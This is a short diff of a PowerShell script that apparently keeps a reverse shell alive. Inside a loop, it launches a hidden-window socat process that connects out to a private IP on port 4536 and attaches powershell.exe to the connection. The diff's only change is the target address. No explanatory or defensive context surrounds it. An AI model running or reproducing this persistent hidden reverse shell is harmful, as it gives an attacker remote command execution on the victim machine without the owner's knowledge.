@@ -6,7 +6,7 @@ $scriptBlock = [Scriptblock]::Create(@'
 	
 }else{
 	Write-Host "not running, bye bye..."	
-	powershell.exe -windowstyle hidden .\socat -d -d TCP4:192.168.1.179:4536 EXEC:'powershell.exe',pipes
+	powershell.exe -windowstyle hidden .\socat -d -d TCP4:192.168.100.28:4536 EXEC:'powershell.exe',pipes
 }
 '@)
 while($true){
